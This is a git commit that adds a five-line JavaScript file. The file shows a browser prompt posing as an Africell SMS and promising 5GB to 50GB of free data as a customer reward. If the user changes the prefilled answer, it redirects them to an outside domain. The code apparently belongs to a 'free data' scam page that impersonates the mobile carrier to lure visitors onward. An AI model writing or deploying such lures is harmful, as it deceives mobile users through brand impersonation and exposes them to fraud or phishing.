6be35d8d7f79b603013a058dc080f535b7a2d147
dataviewz <gloliousam2@gmail.com>
2026-05-31 13:40:26 -0700

    Create active-freeafricelldata.js

---
+++ active-freeafricelldata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('AFRICELL SMS: Dear Customer, Kindly Check If your Africell Sim Card Is Qualify To Receive From 5GB To 50GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://ebekpoekpo.site/freeafricelldata.html';
+}
